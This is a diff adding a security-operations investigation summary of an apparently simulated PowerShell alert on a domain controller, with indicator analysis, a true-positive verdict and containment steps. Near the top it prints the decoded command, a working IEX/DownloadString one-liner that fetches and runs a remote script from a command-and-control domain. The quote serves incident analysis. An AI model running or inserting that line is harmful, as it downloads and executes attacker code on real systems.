@@ -1,0 +1,80 @@
+## Investigation Summary
+
+### Alert Classification and Severity Assessment
+- **Alert Type:** High severity PowerShell-based defense evasion attack
+- **Risk Score:** 87/100
+- **MITRE ATT&CK Techniques:** T1059.001 (PowerShell), T1027 (Obfuscated Files)
+- **Affected System:** Domain Controller (DC01.corp.widgets-inc.com)
+
+### Decoded PowerShell Command
+The base64 encoded command decodes to:
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('https://c2-relay.darkops.net/stager.ps1')
+```
+This is a classic malware dropper pattern attempting to download and execute a remote PowerShell script.
+
+### Indicators of Compromise Analysis
+
+#### 1. IP Address: 198.51.100.99
+- **Risk Level:** LOW (False Positive)
+- **VirusTotal:** 0/94 malicious detections, marked as "harmless" by most engines
+- **AbuseIPDB:** 0% abuse confidence score, marked as "Reserved" usage type
+- **Analysis:** This is a TEST-NET-1 reserved IP address (RFC 5737) used for documentation and testing. It should never appear in live network traffic, indicating this is likely a simulated/test alert.
+
+#### 2. Domain: c2-relay.darkops.net
+- **Risk Level:** SUSPICIOUS
+- **VirusTotal:** 0/94 malicious detections but tagged as "dga" (Domain Generation Algorithm)
+- **Registration:** Registered 2013-11-28, expires 2024-11-28 (expired)
+- **Registrar:** EurotrashNames.com LLC with privacy masking
+- **Analysis:** Suspicious domain name suggesting command-and-control infrastructure. The "darkops" name is clearly malicious-sounding, and the DGA tag indicates algorithmic generation typical of malware.
+
+#### 3. URL: https://c2-relay.darkops.net/stager.ps1
+- **Risk Level:** HIGH
+- **VirusTotal:** URL not found in database (404 error)
+- **Analysis:** The URL path "/stager.ps1" is consistent with malware staging operations. The 404 suggests the payload may have been removed or the infrastructure taken down.
+
+#### 4. File Hash: de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c
+- **Risk Level:** LOW (Legitimate)
+- **VirusTotal:** 0/75 malicious detections
+- **Analysis:** This is the legitimate Microsoft PowerShell.exe binary (version 10.0.17763.1). The file is digitally signed by Microsoft and distributed with Windows Server 2019. However, Sigma rules detected suspicious execution patterns.
+
+### Risk Assessment Summary
+
+1. **IP Address (198.51.100.99):** LOW - Reserved test IP, should not exist in production
+2. **Domain (c2-relay.darkops.net):** HIGH - Suspicious C2-like domain with DGA characteristics
+3. **URL (stager.ps1):** HIGH - Classic malware staging URL pattern
+4. **PowerShell Binary:** LOW - Legitimate Microsoft binary, but used maliciously
+
+### Overall Verdict: **TRUE POSITIVE**
+
+Despite the use of a test IP address, this represents a genuine security incident because:
+
+1. **Malicious Intent:** The PowerShell command demonstrates clear malicious intent to download and execute remote code
+2. **Attack Techniques:** Uses multiple evasion techniques (encoded commands, execution policy bypass, hidden window)
+3. **Target System:** Executed on a critical domain controller
+4. **C2 Infrastructure:** Attempts to contact suspicious command-and-control infrastructure
+
+### Recommended Next Steps
+
+**IMMEDIATE (Priority 1):**
+1. **Isolate DC01** from the network to prevent lateral movement
+2. **Kill the PowerShell process** (PID 4128) if still running
+3. **Check for persistence mechanisms** on DC01
+4. **Review authentication logs** for the SYSTEM account on DC01
+
+**SHORT-TERM (Priority 2):**
+1. **Full forensic imaging** of DC01 before remediation
+2. **Network traffic analysis** for any successful connections to c2-relay.darkops.net
+3. **Hunt for similar PowerShell executions** across the environment
+4. **Check for additional compromised systems** using the same techniques
+
+**LONG-TERM (Priority 3):**
+1. **Implement PowerShell logging** and monitoring
+2. **Deploy application whitelisting** to prevent unauthorized script execution
+3. **Review and harden** domain controller security configurations
+4. **Conduct threat hunting** for advanced persistent threats
+
+**INVESTIGATION NOTES:**
+- The use of a test IP suggests this may be from a security exercise, penetration test, or training scenario
+- However, the execution on a production domain controller requires immediate response regardless of intent
+- Verify with security team if this was authorized testing before proceeding with containment
